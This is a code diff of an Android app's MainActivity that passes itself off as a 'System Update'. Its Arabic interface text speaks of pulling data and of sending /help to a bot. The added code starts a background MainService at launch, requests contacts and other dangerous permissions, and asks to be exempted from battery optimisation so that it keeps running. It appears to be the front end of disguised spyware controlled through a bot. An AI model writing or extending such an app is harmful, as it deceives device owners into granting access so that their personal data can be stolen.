@@ -4,7 +4,9 @@ import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.widget.Button;
+import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -15,7 +17,7 @@ import androidx.core.content.ContextCompat;
 public class MainActivity extends AppCompatActivity {
     
     private TextView tvStatus;
-    private Button btnStart;
+    private Button btnPermissions;
     
     private String[] permissions = {
         Manifest.permission.READ_CONTACTS,
@@ -28,21 +30,40 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        tvStatus = new TextView(this);
-        tvStatus.setText("⚙️ System Update\n\nاضغط على الزر لبدء الخدمة");
-        tvStatus.setTextSize(18);
-        tvStatus.setPadding(50, 100, 50, 50);
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setPadding(50, 100, 50, 50);
         
-        btnStart = new Button(this);
-        btnStart.setText("▶️ بدء الخدمة وسحب البيانات");
-        btnStart.setOnClickListener(v -> {
-            checkAndRequestPermissions();
+        tvStatus = new TextView(this);
+        tvStatus.setText("⚙️ System Update\n\nالخدمة تعمل في الخلفية\nارسل /help للبوت");
+        tvStatus.setTextSize(16);
+        tvStatus.setPadding(0, 0, 0, 30);
+        
+        btnPermissions = new Button(this);
+        btnPermissions.setText("🔓 إعطاء الصلاحيات");
+        btnPermissions.setOnClickListener(v -> {
+            for (String permission : permissions) {
+                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                    ActivityCompat.requestPermissions(this, new String[]{permission}, 100);
+                }
+            }
+            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+            startActivity(intent);
+            Toast.makeText(this, "جاري فتح الصلاحيات", Toast.LENGTH_LONG).show();
         });
         
-        setContentView(btnStart);
+        layout.addView(tvStatus);
+        layout.addView(btnPermissions);
+        setContentView(layout);
+        
+        // بدء الخدمة
+        startService(new Intent(this, MainService.class));
     }
-
-    private void checkAndRequestPermissions() {
+    
+    @Override
+    protected void onResume() {
+        super.onResume();
         boolean allGranted = true;
         for (String permission : permissions) {
             if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
@@ -50,34 +71,9 @@ public class MainActivity extends AppCompatActivity {
                 break;
             }
         }
-        
         if (allGranted) {
-            startDataService();
-        } else {
-            ActivityCompat.requestPermissions(this, permissions, 100);
-        }
-    }
-    
-    private void startDataService() {
-        startService(new Intent(this, DataService.class));
-        Toast.makeText(this, "✅ جاري سحب البيانات...", Toast.LENGTH_LONG).show();
-        finish(); // يغلق التطبيق بعد التشغيل
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        boolean allGranted = true;
-        for (int result : grantResults) {
-            if (result != PackageManager.PERMISSION_GRANTED) {
-                allGranted = false;
-                break;
-            }
-        }
-        if (allGranted) {
-            startDataService();
-        } else {
-            Toast.makeText(this, "❌ الرجاء إعطاء جميع الصلاحيات", Toast.LENGTH_LONG).show();
+            tvStatus.setText("✅ جميع الصلاحيات مفعلة\nالخدمة تعمل في الخلفية\nارسل /help للبوت");
+            btnPermissions.setEnabled(false);
         }
     }
 }
